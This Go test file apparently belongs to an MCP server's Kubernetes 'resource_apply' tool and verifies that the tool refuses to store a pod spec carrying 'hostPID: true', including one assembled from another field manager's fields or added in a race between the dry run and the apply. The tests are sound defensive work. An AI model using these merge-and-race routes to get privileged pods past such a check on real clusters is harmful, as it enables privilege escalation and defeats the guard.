	dc, err := dynamic.NewForConfig(kubetest.Start(t))
	if err != nil {
		t.Fatal(err)
	}
	crds := dc.Resource(schema.GroupVersionResource{Group: "apiextensions.k8s.io", Version: "v1", Resource: "customresourcedefinitions"})
	if _, err := crds.Apply(t.Context(), "podholders.example.com", &unstructured.Unstructured{Object: map[string]any{
		"apiVersion": "apiextensions.k8s.io/v1", "kind": "CustomResourceDefinition",
		"metadata": map[string]any{"name": "podholders.example.com"},
		"spec": map[string]any{
			"group": "example.com",
			"names": map[string]any{"plural": "podholders", "singular": "podholder", "kind": "PodHolder"},
			"scope": "Namespaced",
			"versions": []any{map[string]any{
				"name": "v1", "served": true, "storage": true,
				"schema": map[string]any{"openAPIV3Schema": map[string]any{
					"type": "object",
					"properties": map[string]any{"spec": map[string]any{
						"type": "object", "x-kubernetes-preserve-unknown-fields": true,
					}},
				}},
			}},
		},
	}}, metav1.ApplyOptions{FieldManager: "external-manager", Force: true}); err != nil {
		t.Fatal(err)
	}
	waitForServedResource(t, s.typed, "example.com/v1", "podholders")

	holder := func(name string, worker map[string]any) map[string]any {
		return map[string]any{
			"apiVersion": "example.com/v1", "kind": "PodHolder",
			"metadata": map[string]any{"name": name, "namespace": s.namespace},
			"spec":     map[string]any{"worker": worker},
		}
	}
	containers := []any{map[string]any{"name": "c", "image": "busybox"}}
	holders := dc.Resource(schema.GroupVersionResource{Group: "example.com", Version: "v1", Resource: "podholders"}).Namespace(s.namespace)
	if _, err := holders.Apply(t.Context(), "assembled", &unstructured.Unstructured{
		Object: holder("assembled", map[string]any{"hostPID": true}),
	}, metav1.ApplyOptions{FieldManager: "external-manager"}); err != nil {
		t.Fatal(err)
	}

	msg := s.callExpectingError(t, "resource_apply", map[string]any{
		"manifest": holder("assembled", map[string]any{"containers": containers}),
	})
	if !strings.Contains(msg, "hostPID") || !strings.Contains(msg, "would store") {
		t.Errorf("error %q does not refuse the merged hostPID pod spec", msg)
	}
	got, err := holders.Get(t.Context(), "assembled", metav1.GetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if _, found, _ := unstructured.NestedFieldNoCopy(got.Object, "spec", "worker", "containers"); found {
		t.Error("the refused apply was persisted anyway")
	}

	t.Run("a change between the checked dry run and the apply is checked again", func(t *testing.T) {
		if _, err := holders.Apply(t.Context(), "raced", &unstructured.Unstructured{
			Object: holder("raced", map[string]any{"replicas": int64(1)}),
		}, metav1.ApplyOptions{FieldManager: "external-manager"}); err != nil {
			t.Fatal(err)
		}
		fired := false
		defer mcpsrv.SetAfterApplyPreviewForTest(func() {
			if fired {
				return
			}
			fired = true
			if _, err := holders.Apply(context.Background(), "raced", &unstructured.Unstructured{
				Object: holder("raced", map[string]any{"replicas": int64(1), "hostPID": true}),
			}, metav1.ApplyOptions{FieldManager: "external-manager"}); err != nil {
				t.Error(err)
			}
		})()
		msg := s.callExpectingError(t, "resource_apply", map[string]any{
			"manifest": holder("raced", map[string]any{"containers": containers}),
		})
		if !fired || !strings.Contains(msg, "hostPID") {
			t.Errorf("hook fired %v; error %q does not refuse the hostPID added after the dry run", fired, msg)
		}
		got, err := holders.Get(t.Context(), "raced", metav1.GetOptions{})
		if err != nil {
			t.Fatal(err)
		}
		if _, found, _ := unstructured.NestedFieldNoCopy(got.Object, "spec", "worker", "containers"); found {
			t.Error("the apply raced past its check and was persisted")
		}
	})

	t.Run("a harmless change between the dry run and the apply is retried", func(t *testing.T) {
		fired := false
		defer mcpsrv.SetAfterApplyPreviewForTest(func() {
			if fired {
				return
			}
			fired = true
			if _, err := holders.Apply(context.Background(), "retried", &unstructured.Unstructured{
				Object: holder("retried", map[string]any{"replicas": int64(2)}),
			}, metav1.ApplyOptions{FieldManager: "external-manager"}); err != nil {
				t.Error(err)
			}
		})()
		if _, err := holders.Apply(t.Context(), "retried", &unstructured.Unstructured{
			Object: holder("retried", map[string]any{"replicas": int64(1)}),
		}, metav1.ApplyOptions{FieldManager: "external-manager"}); err != nil {
			t.Fatal(err)
		}
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{
			"manifest": holder("retried", map[string]any{"containers": containers}),
		}, &out)
		got, err := holders.Get(t.Context(), "retried", metav1.GetOptions{})
		if err != nil {
			t.Fatal(err)
		}
		if _, found, _ := unstructured.NestedFieldNoCopy(got.Object, "spec", "worker", "containers"); !fired || !found {
			t.Errorf("hook fired %v; the retried apply did not persist its containers: %v", fired, got.Object["spec"])
		}
	})

	t.Run("the same manifest applies where no other manager added anything", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{
			"manifest": holder("plain", map[string]any{"containers": containers}),
		}, &out)
		if out.Name != "plain" {
			t.Errorf("out = %+v", out)
		}
	})
}
